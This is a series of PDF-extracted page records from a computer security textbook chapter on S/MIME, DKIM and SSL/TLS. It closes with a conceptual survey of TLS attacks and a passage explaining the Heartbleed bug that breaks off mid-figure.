       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 686, 'page_label': '685'}, page_content='22.1 / SECURE E-MAIL AND S/MIME  685\\nFigure 22.1 provides a general overview of S/MIME functional flow.\\nSigned and C lear-Signed data The preferred algorithms used for signing  \\nS/MIME messages use either an R SA or a Digital Signature Algorithm (DSA) sig-\\nnature of an SHA-256 message hash. The process works as follows. Take the message \\nyou want to send and map it into a fixed-length code of  256 bits, using SHA-256. \\nThe 256-bit  message digest is,  for all practical purposes, unique for this message. \\nIt\\xa0would be virtually impossible for someone to alter this message or substitute \\nFigure 22.1 Simplified S/MIME Functional Flow\\nSign\\n(e.g., RSA/\\nSHA-256)\\nSender’s\\nprivate key\\n(a) Sender signs, and then encrypts message\\n(b) Receiver decrypts message, and then veriﬁes sender’s signature\\nOne-time\\nsecret key\\nEncrypt\\n(e.g,\\nAES-128/\\nCBC) \\nEncrypt\\n(e.g., RSA)\\nMsg Msg\\nSig\\nMsg\\nSig\\nMsg\\nSig\\nMsg\\nSig\\nReceiver’s\\npublic key\\nSender’s\\npublic key\\nDecrypt\\n(e.g., RSA)\\nReceiver’s\\nprivate key\\nSecret key\\ngenerated by\\nsender\\nDecrypt\\n(e.g,\\nAES-128/\\nCBC)\\nVerify\\nsignature\\n(e.g., RSA/\\nSHA-256)\\nM22_STAL0611_04_GE_C22.indd   685 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 687, 'page_label': '686'}, page_content='686  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nanother message and still come up with the same digest. Then, S/MIME encrypts the \\ndigest using RSA and the sender’s private RSA key. The result is the digital signature, \\nwhich is attached to the message, as we discuss in Chapter 2. Now, anyone who gets \\nthis message can recompute the message digest then decrypt the signature using RSA \\nand the sender’s public RSA key. If the message digest in the signature matches the \\nmessage digest that was calculated, then the signature is valid. Since this operation \\nonly involves encrypting and decrypting a 256-bit block, it takes up little time. The \\nDSA can be used instead of RSA as the signature algorithm.\\nThe signature is a binary string, and sending it in that form through the Internet \\ne-mail system could result in unintended alteration of the contents, because some \\ne-mail software will attempt to interpret the message content looking for control \\ncharacters such as line feeds. To protect the data, either the signature alone or the sig-\\nnature plus the message are mapped into printable ASCII characters using a scheme \\nknown as radix-64 or base64 mapping. Radix-64 maps each input group of three octets \\nof binary data into four ASCII characters (see Appendix G).\\nenveloped data The default algorithms used for encrypting S/MIME messages are \\nAES and RSA. To begin, S/MIME generates a pseudorandom secret key; this is used to \\nencrypt the message using AES or some other conventional encryption scheme, such as \\n3DES. In any conventional encryption application, the problem of key distribution must \\nbe addressed. In S/MIME, each conventional key is used only once. That is, a new pseu-\\ndorandom key is generated for each new message encryption. This session key is bound \\nto the message and transmitted with it. The secret key is used as input to the public-key \\nencryption algorithm, RSA, which encrypts the key with the recipient’s public RSA key. \\nOn the receiving end, S/MIME uses the receiver’s private RSA key to recover the secret \\nkey, then uses the secret key and AES to recover the plaintext message.\\nIf encryption is used alone, radix-64 is used to convert the ciphertext to ASCII \\nformat.\\npubliC-Key CertifiCateS As can be seen from the discussion so far , S/MIME \\ncontains a clever, efficient, interlocking set of functions and formats to provide an \\neffective encryption and signature service. To complete the system, one final area \\nneeds to be addressed, that of public-key management.\\nThe basic tool that permits widespread use of S/MIME is the public-key certifi-\\ncate. S/MIME uses certificates that conform to the international standard X.509v3 \\nthat we discuss in Chapter 23.\\n 22.2 DOMAINKEYS IDENTIFIED MAIL\\nDomainKeys Identified Mail (DKIM) is a specification for cryptographically signing \\ne-mail messages, permitting a signing domain to claim responsibility for a message in \\nthe mail stream. Message recipients (or agents acting in their behalf) can verify the \\nsignature by querying the signer’s domain directly to retrieve the appropriate public \\nkey and thereby can confirm that the message was attested to by a party in possession \\nof the private key for the signing domain. DKIM is specified in Internet Standard \\nRFC 4871 (DomainKeys Identified Mail (DKIM) Signatures, 2007). DKIM has been \\nM22_STAL0611_04_GE_C22.indd   686 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 688, 'page_label': '687'}, page_content='22.2 / DoMAINKEyS IDENTIFIED MAIL  687\\nwidely adopted by a range of e-mail providers, including corporations, government \\nagencies, gmail, yahoo, and many Internet service providers (ISPs).\\nInternet Mail Architecture\\nTo understand the operation of DKIM, it is useful to have a basic grasp of the  Internet \\nmail architecture, which is currently defined in RFC 5598 (Internet Mail Architecture, \\n2009). This subsection provides an overview of the basic concepts.\\nAt its most fundamental level, the Internet mail architecture consists of a user \\nworld in the form of Message User Agents (MUA), and the transfer world, in the \\nform of the Message Handling Service (MHS), which is composed of Message Trans-\\nfer Agents (MTA). The MHS accepts a message from one user and delivers it to one \\nor more other users, creating a virtual MUA-to-MUA exchange environment. This \\narchitecture involves three types of interoperability. One is directly between users: \\nmessages must be formatted by the MUA on behalf of the message author so the \\nmessage can be displayed to the message recipient by the destination MUA. There \\nare also interoperability requirements between the MUA and the MHS—first when \\na message is posted from an MUA to the MHS, and later when it is delivered from \\nthe MHS to the destination MUA. Interoperability is required among the MTA com-\\nponents along the transfer path through the MHS.\\nFigure 22.2 illustrates the key components of the Internet mail architecture, \\nwhich include the following:\\n• Message User Agent (MUA): Works on behalf of user actors and user applica-\\ntions. It is their representative within the e-mail service. Typically, this function \\nis housed in the user’s computer and is referred to as a client e-mail program \\nor a local network e-mail server. The author MUA formats a message and per-\\nforms initial submission into the MHS via a MSA. The recipient MUA processes \\nreceived mail for storage and/or display to the recipient user.\\n• Mail submission agent (MSA): Accepts the message submitted by an MUA and \\nenforces the policies of the hosting domain and the requirements of Internet \\nstandards. This function may be located together with the MUA or as a separate \\nfunctional model. In the latter case, the Simple Mail Transfer Protocol (SMTP) \\nis used between the MUA and the MSA.\\n• Message transfer agent (MTA): Relays mail for one application-level hop. It is \\nlike a packet switch or IP router in that its job is to make routing assessments \\nand to move the message closer to the recipients. Relaying is performed by a \\nsequence of MTAs until the message reaches a destination MDA. An MTA also \\nadds trace information to the message header. SMTP is used between MTAs \\nand between an MTA and an MSA or MDA.\\n• Mail delivery agent (MDA): Responsible for transferring the message from the \\nMHS to the MS.\\n• Message stor e (MS):  An MUA can employ a long-term MS. An MS can be \\nlocated on a remote server, or on the same machine as the MUA. Typically, \\nan MUA retrieves messages from a remote server using POP (Post Office \\n Protocol) or IMAP (Internet Message Access Protocol).\\nM22_STAL0611_04_GE_C22.indd   687 10/11/17   3:20 PM\\nhttps://sanet.st/blogs/polatebooks'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 689, 'page_label': '688'}, page_content='688  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nTwo other concepts need to be defined. An administrative management domain \\n(ADMD) is an Internet e-mail provider. Examples include a department that oper-\\nates a local mail relay (MTA), an IT department that operates an enterprise mail \\nrelay, and an ISP that operates a public shared e-mail service. Each ADMD can have \\ndifferent operating policies and trust-based decision making. One obvious example is \\nthe distinction between mail that is exchanged within an organization and mail that  \\nis exchanged between independent organizations. The rules for handling the two \\ntypes of traffic tend to be quite different.\\nThe Domain name system (DNS)  is a directory lookup service that provides \\na mapping between the name of a host on the Internet and its numerical address.\\nDKIM Strategy\\nDKIM is designed to provide an e-mail authentication technique that is transparent \\nto the end user. In essence, a user’s e-mail message is signed by a private key of the \\nadministrative domain from which the e-mail originates. The signature covers all of \\nthe content of the message and some of the RFC 5322 ( Internet Message Format , \\n2008) message headers. At the receiving end, the MDA can access the corresponding \\npublic key via a DNS and verify the signature, thus authenticating that the message \\nFigure 22.2 Function Modules and Standardized Protocols Used Between \\nThem in the Internet Mail Architecture\\nMessage user\\nagent (MUA)\\nMessage\\nauthor\\nMessage\\nrecipient\\nESMTP\\n(Submission)\\nSMTP\\nSMTP SMTP\\nESMTP\\n(Submission)\\n(SMTP,\\nlocal)\\n(IMAP, POP,\\nlocal)\\nMail submission\\nagent (MSA)\\nMessage transfer\\nagent (MTA)\\nMessage transfer\\nagent (MTA)\\nMESSAGE HANDLING\\nSYSTEM (MHS)\\nMessage transfer\\nagent (MTA)\\nMail delivery\\nagent (MDA)\\nMessage store\\n(MS)\\nMessage user\\nagent (MUA)\\nM22_STAL0611_04_GE_C22.indd   688 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 690, 'page_label': '689'}, page_content='22.2 / DoMAINKEyS IDENTIFIED MAIL  689\\ncomes from the claimed administrative domain. Thus, mail that originates from some-\\nwhere else but claims to come from a given domain will not pass the authentication \\ntest and can be rejected. This approach differs from that of S/MIME, which uses the \\noriginator’s private key to sign the content of the message. The motivation for DKIM \\nis based on the  following reasoning:\\n1. S/MIME depends on both the sending and receiving users employing S/MIME. \\nFor almost all users, the bulk of incoming mail does not use S/MIME, and the \\nbulk of the mail the user wants to send is to recipients not using S/MIME.\\n2. S/MIME signs only the message content. Thus, RFC 5322 header information \\nconcerning origin can be compromised.\\n3. DKIM is not implemented in client programs (MUAs) and is therefore  transparent \\nto the user; the user need take no action.\\n4. DKIM applies to all mail from cooperating domains.\\n5. DKIM allows good senders to prove that they did send a particular message \\nand to prevent forgers from masquerading as good senders.\\nFigure 22.3 is a simple example of the operation of DKIM. We begin with a \\nmessage generated by a user and transmitted into the MHS to an MSA that is within \\nthe user’s administrative domain. An e-mail message is generated by an e-mail client \\nFigure 22.3 Simple Example of DKIM Deployment\\nMail origination\\nnetwork\\nMail delivery\\nnetwork\\nDNS Public key query/response\\nDNS  = domain name system\\nMDA = mail delivery agent\\nMSA  = mail submission agent\\nMTA  = message transfer agent\\nMUA = message user agent\\nSMTP\\nMUA\\nMUA\\nSMTP\\nSMTP\\nSigner Veriﬁer\\nSMTP\\nPOP, IMAP\\nMTAMSA\\nMTAMDA\\nDNS\\nM22_STAL0611_04_GE_C22.indd   689 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 691, 'page_label': '690'}, page_content='690  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nprogram. The content of the message, plus selected RFC 5322 headers, is signed by \\nthe e-mail provider using the provider’s private key. The signer is associated with a \\ndomain, which could be a corporate local network, an ISP , or a public e-mail facility \\nsuch as gmail. The signed message then passes through the Internet via a sequence \\nof MTAs. At the destination, the MDA retrieves the public key for the incoming \\nsignature and verifies the signature before passing the message on to the destination \\ne-mail client. The default signing algorithm is RSA with SHA-256. RSA with SHA-1 \\nalso may be used.\\n 22.3 SECURE SOCKETS LAYER (SSL) AND TRANSPORT LAYER \\nSECURITY (TLS)\\nOne of the most widely used security services is the Secure Sockets Layer (SSL) and \\nthe follow-on Internet standard RFC 4346 (The Transport Layer Security (TLS) Pro-\\ntocol Version 1.1, 2006). TLS has largely supplanted earlier SSL implementations. TLS \\nis a general-purpose service implemented as a set of protocols that rely on TCP . At this \\nlevel, there are two implementation choices. For full generality, TLS could be provided \\nas part of the underlying protocol suite and therefore be transparent to applications. \\nAlternatively, TLS can be embedded in specific packages. For example, most brows-\\ners come equipped with SSL, and most Web servers have implemented the protocol.\\nTLS Architecture\\nTLS is designed to make use of TCP to provide a reliable end-to-end secure  service. \\nTLS is not a single protocol but rather two layers of protocols, as illustrated in  \\nFigure 22.4.\\nThe Record Protocol provides basic security services to various higher-layer \\nprotocols. In particular, the Hypertext Transfer Protocol (HTTP), which provides \\nthe transfer service for Web client/server interaction, can operate on top of TLS. \\nThree higher-layer protocols are defined as part of TLS: the Handshake Protocol, the \\nChange Cipher Spec Protocol, and the Alert Protocol. These TLS-specific protocols \\nare used in the management of TLS exchanges, and are examined later in this section.\\nFigure 22.4 SSL/TLS Protocol Stack\\nIP\\nTCP\\nRecord Protocol\\nHandshake\\nProtocol\\nChange\\nCipher Spec\\nProtocol\\nAlert\\nProtocol HTTP Heartbeat\\nProtocol\\nM22_STAL0611_04_GE_C22.indd   690 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 692, 'page_label': '691'}, page_content='22.3 / SECURE SoCKETS LAyER (SSL) AND TRANSPoRT LAyER SECURITy (TLS)  691\\nTwo important TLS concepts are the TLS session and the TLS connection, \\nwhich are defined in the specification as follows:\\n• Connection: A connection is a transport (in the OSI layering model definition) \\nthat provides a suitable type of service. For TLS, such connections are peer-to-\\npeer relationships. The connections are transient. Every connection is associ -\\nated with one session.\\n• Session: A TLS session is an association between a client and a server. Sessions \\nare created by the Handshake Protocol. Sessions define a set of cryptographic \\nsecurity parameters, which can be shared among multiple connections. Sessions \\nare used to avoid the expensive negotiation of new security parameters for each \\nconnection.\\nBetween any pair of parties (applications such as HTTP on client and server), \\nthere may be multiple secure connections. In theory, there may also be multiple simul-\\ntaneous sessions between parties, but this feature is not used in practice.\\nTLS Protocols\\nreCord protoCol The SSL Record Protocol provides two services for SSL \\nconnections:\\n• Confidentiality: The Handshake Protocol defines a shared secret key that is \\nused for symmetric encryption of SSL payloads.\\n• Message integrity:  The Handshake Protocol also defines a shared secret key \\nthat is used to form a message authentication code (MAC).\\nFigure 22.5 indicates the overall operation of the SSL Record Protocol. The \\nfirst step is fragmentation. Each upper-layer message is fragmented into blocks of \\n214 bytes (16,384 bytes) or less. Next, compression is optionally applied. The next \\nFigure 22.5 TLS Record Protocol Operation\\nApplication data\\nFragment\\nCompress\\nAdd MAC\\nEncrypt\\nPrepend TLS\\nrecord header\\nM22_STAL0611_04_GE_C22.indd   691 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 693, 'page_label': '692'}, page_content='692  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nstep in processing is to compute a message authentication code over the compressed \\ndata. Next, the compressed message plus the MAC are encrypted using symmetric \\nencryption.\\nThe final step of SSL Record Protocol processing is to prepend a header, which \\nincludes version and length fields.\\nThe content types that have been defined are change_cipher_spec, alert, \\n handshake, and application_data. The first three are the TLS-specific protocols, dis-\\ncussed next. Note that no distinction is made among the various applications (e.g., \\nHTTP) that might use TLS; the content of the data created by such applications is \\nopaque to TLS.\\nThe Record Protocol then transmits the resulting unit in a TCP segment. \\nReceived data are decrypted, verified, decompressed, and reassembled, then deliv -\\nered to higher-level users.\\nChange Cipher SpeC protoCol The Change Cipher Spec Protocol is one of the \\nfour TLS-specific protocols that use the TLS Record Protocol, and it is the simplest. \\nThis protocol consists of a single message, which consists of a single byte with the \\nvalue 1. The sole purpose of this message is to cause the pending state to be copied \\ninto the current state, which updates the cipher suite to be used on this connection.\\nalert protoCol The Alert Protocol is used to convey TLS-related alerts to the \\npeer entity. As with other applications that use TLS, alert messages are compressed \\nand encrypted, as specified by the current state.\\nEach message in this protocol consists of two bytes. The first byte takes the \\nvalue warning(1) or fatal(2) to convey the severity of the message. If the level is fatal, \\nTLS immediately terminates the connection. Other connections on the same session \\nmay continue, but no new connections on this session may be established. The second \\nbyte contains a code that indicates the specific alert. An example of a fatal alert is an \\nincorrect MAC. An example of a nonfatal alert is a close_notify message, which noti-\\nfies the recipient that the sender will not send any more messages on this connection.\\nhandShaKe protoCol The most complex part of TLS is the Handshake Protocol. \\nThis protocol allows the server and client to authenticate each other and to negoti -\\nate an encryption and MAC algorithm and cryptographic keys to be used to protect \\ndata sent in an TLS record. The Handshake Protocol is used before any application \\ndata are transmitted.\\nThe Handshake Protocol consists of a series of messages exchanged by client \\nand server. Figure 22.6 shows the initial exchange needed to establish a logical con-\\nnection between client and server. The exchange can be viewed as having four phases.\\nPhase 1 is used to initiate a logical connection and to establish the security \\ncapabilities that will be associated with it. The exchange is initiated by the client, \\nwhich sends a client_hello message with the following parameters:\\n• Version: The highest TLS version understood by the client.\\n• Random: A client-generated random structure, consisting of a 32-bit timestamp \\nand 28 bytes generated by a secure random number generator. These values are \\nused during key exchange to prevent replay attacks.\\n• Session ID: A variable-length session identifier. A nonzero value indicates that \\nthe client wishes to update the parameters of an existing connection or create \\nM22_STAL0611_04_GE_C22.indd   692 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 694, 'page_label': '693'}, page_content='22.3 / SECURE SoCKETS LAyER (SSL) AND TRANSPoRT LAyER SECURITy (TLS)  693\\na new connection on this session. A zero value indicates that the client wishes \\nto establish a new connection on a new session.\\n• CipherSuite: This is a list that contains the combinations of cryptographic algo-\\nrithms supported by the client, in decreasing order of preference. Each element \\nof the list (each cipher suite) defines both a key exchange algorithm and a \\nCipherSpec.\\n• Compression method:  This is a list of the compression methods the client \\nsupports.\\nFigure 22.6 Handshake Protocol Action\\nClient Server\\nPhase 1\\nEstablish security capabilities, including\\nprotocol version, session ID, cipher suite,\\ncompression method, and initial random\\nnumbers.\\nPhase 2\\nServer may send certiﬁcate, key exchange,\\nand request certiﬁcate. Server signals end\\nof hello message phase.\\nPhase 3\\nClient sends certiﬁcate if requested. Client\\nsends key exchange. Client may send\\ncertiﬁcate veriﬁcation.\\nPhase 4\\nChange cipher suite and ﬁnish\\nhandshake protocol.\\nNote: Shaded transfers are\\noptional or situation-dependent\\nmessages that are not always sent.\\nﬁnished\\nchange_cipher_spec\\nﬁnished\\nchange_cipher_spec\\ncertiﬁcate_verify\\nclient_key_exchange\\ncertiﬁcate\\nserver_hello_done\\ncertiﬁcate_request\\nserver_key_exchange\\ncertiﬁcate\\nserver_hello\\nclient_hello\\nTime\\nM22_STAL0611_04_GE_C22.indd   693 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 695, 'page_label': '694'}, page_content='694  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nAfter sending the client_hello message, the client waits for the server_hello \\nmessage, which contains the same parameters as the client_hello message.\\nThe details of phase 2 depend on the underlying public-key encryption scheme \\nthat is used. In some cases, the server passes a certificate to the client, possibly addi-\\ntional key information, and a request for a certificate from the client.\\nThe final message in phase 2, and one that is always required, is the server_done \\nmessage, which is sent by the server to indicate the end of the server hello and associ-\\nated messages. After sending this message, the server will wait for a client response.\\nIn phase 3, upon receipt of the server_done message, the client should verify \\nthat the server provided a valid certificate if required and check that the server_hello \\nparameters are acceptable. If all is satisfactory, the client sends one or more messages \\nback to the server, depending on the underlying public-key scheme.\\nPhase 4 completes the setting up of a secure connection. The client sends a \\nchange_cipher_spec message and copies the pending CipherSpec into the current \\nCipherSpec. Note this message is not considered part of the Handshake Protocol but \\nis sent using the Change Cipher Spec Protocol. The client then immediately sends the \\nfinished message under the new algorithms, keys, and secrets. The finished message \\nverifies that the key exchange and authentication processes were successful.\\nIn response to these two messages, the server sends its own change_cipher_\\nspec message, transfers the pending to the current CipherSpec, and sends its finished \\n message. At this point, the handshake is complete, and the client and server may begin \\nto exchange application layer data.\\nheartbeat protoCol In the context of computer networks, a heartbeat is a peri-\\nodic signal generated by hardware or software to indicate normal operation or to \\nsynchronize other parts of a system. A Heartbeat Protocol is typically used to moni-\\ntor the availability of a protocol entity. In the specific case of SSL/TLS, a Heartbeat \\nprotocol was defined in 2012 in RFC 6250 ( Transport Layer Security (TLS) and \\nDatagram Transport Layer Security (DTLS) Heartbeat Extension, 2011).\\nThe Heartbeat Protocol runs on the top of the TLS Record Protocol and con-\\nsists of two message types: heartbeat_request and heartbeat_response. The use of \\nthe Heartbeat Protocol is established during Phase 1 of the Handshake Protocol \\n(see Figure 22.6). Each peer indicates whether it supports heartbeats. If heartbeats \\nare supported, the peer indicates whether it is willing to receive heartbeat_request \\n messages and respond with heartbeat_r esponse messages or only willing to send \\nheartbeat_request messages.\\nA heartbeat_request message can be sent at any time. Whenever a request \\nmessage is received, it should be answered promptly with a corresponding heartbeat_\\nresponse message. The heartbeat_request message includes payload length, payload, \\nand padding fields. The payload is a random content between 16 bytes and 64 Kbytes \\nin length. The corresponding heartbeat_response message must include an exact copy \\nof the received payload. The padding is also a random content. The padding enables \\nthe sender to perform a path maximum transfer unit (MTU) discovery operation, by \\nsending requests with increasing padding until there is no answer anymore, because \\none of the hosts on the path cannot handle the message.\\nThe heartbeat serves two purposes. First, it assures the sender that the recipient \\nis still alive, even though there may not have been any activity over the underlying \\nM22_STAL0611_04_GE_C22.indd   694 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 696, 'page_label': '695'}, page_content='22.3 / SECURE SoCKETS LAyER (SSL) AND TRANSPoRT LAyER SECURITy (TLS)  695\\nTCP connection for a while. Second, the heartbeat generates activity across the con-\\nnection during idle periods, which avoids closure by a firewall that does not tolerate \\nidle connections.\\nThe requirement for the exchange of a payload was designed into the  Heartbeat \\nProtocol to support its use in a connectionless version of TLS known as DTLS. \\nBecause a connectionless service is subject to packet loss, the payload enables the \\nrequestor to match response messages to request messages. For simplicity, the same \\nversion of the Heartbeat Protocol is used with both TLS and DTLS. Thus, the payload \\nis required for both TLS and DTLS.\\nSSL/TLS Attacks\\nSince the first introduction of SSL in 1994, and the subsequent standardization of \\nTLS, numerous attacks have been devised against these protocols. The appearance \\nof each attack has necessitated changes in the protocol, the encryption tools used, or \\nsome aspects of the implementation of SSL and TLS to counter these threats.\\nattaCK CategorieS We can group the attacks into four general categories:\\n• Attacks on the Handshake Pr otocol: As early as 1998, an approach to com -\\npromising the Handshake Protocol based on exploiting the formatting and \\nimplementation of the RSA encryption scheme was presented [BLEI98]. As \\ncountermeasures were implemented, the attack was refined and adjusted to not \\nonly thwart the countermeasures, but also to speed up the attack [e.g., BARD12].\\n• Attacks on the record and a pplication data protocols:  A number of vulner -\\nabilities have been discovered in these protocols, leading to patches to counter \\nthe new threats. As a recent example, in 2011, researchers Thai Duong and \\nJuliano Rizzo demonstrated a proof of concept called BEAST (Browser Exploit \\nAgainst SSL/TLS) that turned what had been considered only a theoretical vul-\\nnerability into a practical attack [GOOD11]. BEAST leverages a type of crypto-\\ngraphic attack called a chosen-plaintext attack. The attacker mounts the attack \\nby choosing a guess for the plaintext that is associated with a known cipher -\\ntext. The researchers developed a practical algorithm for launching successful \\nattacks. Subsequent patches were able to thwart this attack. The authors of the \\nBEAST attack are also the creators of the 2012 CRIME (Compression Ratio \\nInfo-leak Made Easy) attack, which can allow an attacker to recover the content \\nof web cookies when data compression is used along with TLS [GOOD12b]. \\nWhen used to recover the content of secret authentication cookies, it allows an \\nattacker to perform session hijacking on an authenticated web session.\\n• Attacks on the PKI: Checking the validity of X.509 certificates is an activity subject \\nto a variety of attacks, both in the context of SSL/TLS and elsewhere. For example, \\n[GEOR12] demonstrated that commonly used libraries for SSL/TLS suffer from \\nvulnerable certificate validation implementations. The authors revealed weaknesses \\nin the source code of OpenSSL, GnuTLS, JSSE, ApacheHttpClient, Weberknecht, \\ncURL, PHP , Python, and applications build upon or with these products.\\n• Other attacks: [MEYE13] lists a number of attacks that do not fit into any of \\nthe preceding categories. One example is an attack announced in 2011 by the \\nM22_STAL0611_04_GE_C22.indd   695 10/11/17   3:20 PM'),\n",
       " Document(metadata={'producer': 'iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version); modified using iTextSharp™ 5.5.5 ©2000-2014 iText Group NV (AGPL-version)', 'creator': 'PyPDF', 'creationdate': '2017-10-23T12:02:57+05:30', 'author': 'William Stallings', 'moddate': '2018-08-21T06:36:33+03:00', 'title': 'Computer Security: Principles and Practice, Global Edition, 4/e', 'source': 'data/book_new.pdf', 'total_pages': 986, 'page': 697, 'page_label': '696'}, page_content='696  CHAPTER 22 / INTERNET SECURITy PRoToCoLS AND STANDARDS \\nGerman hacker group The Hackers Choice, which is a DoS attack [KUMA11]. \\nThe attack creates a heavy processing load on a server by overwhelming the tar-\\nget with SSL/TLS handshake requests. Boosting system load is done by estab-\\nlishing new connections or using renegotiation. Assuming that the majority of \\ncomputation during a handshake is done by the server the attack creates more \\nsystem load on the server than on the source device, leading to a DoS. The \\nserver is forced to continuously recompute random numbers and keys.\\nThe history of attacks and countermeasures for SSL/TLS is representative of \\nthat for other Internet-based protocols. A “perfect” protocol and a “perfect” imple-\\nmentation strategy are never achieved. A constant back-and-forth between threats \\nand countermeasures determines the evolution of Internet-based protocols.\\nheartbleed A bug discovered in 20 14 in the TLS software created one of the \\npotentially most catastrophic TLS vulnerabilities. The bug was in the open-source \\nOpenSSL implementation of the Heartbeat Protocol. It is important to note that this \\nvulnerability is not a design flaw in the TLS specification; rather it is a programming \\nmistake in the OpenSSL library.\\nTo understand the nature of the vulnerability, recall from our previous discus-\\nsion that the heartbeat_request message includes payload length, payload and pad -\\nding fields. Before the bug was fixed, the OpenSSL version of the Heartbeat Protocol \\nworked as follows: The software reads the incoming request message and allocates a \\nbuffer large enough to hold the message header, the payload, and the padding. It then \\noverwrites the current contents of the buffer with the incoming message, changes the \\nfirst byte to indicate the response message type, then transmits a response message, \\nwhich includes the payload length field and the payload. However, the software does \\nnot check the message length of the incoming message. As a result, an adversary can \\nsend a message that indicates the maximum payload length (64 KB) but only includes \\nthe minimum payload (16 bytes). This means that almost 64 KB of the buffer is not \\noverwritten and whatever happened to be in memory at the time will be sent to \\nFigure 22.7 The Heartbleed Exploit\\nSource: “Heartbleed-The Open SSL Heartbeat Exploit” Copyright © 2014 BAE Systems \\nApplied Intelligence. Reprinted with permission.\\n(a) How TLS Heartbeat\\nProtocol works\\nCLIENT SERVER\\nSend heartbeat\\nrequest message\\nMake sure\\nreceived payload\\nis the same\\nHEARTBEAT REQUEST\\nMESSAGE\\nHEARTBEAT 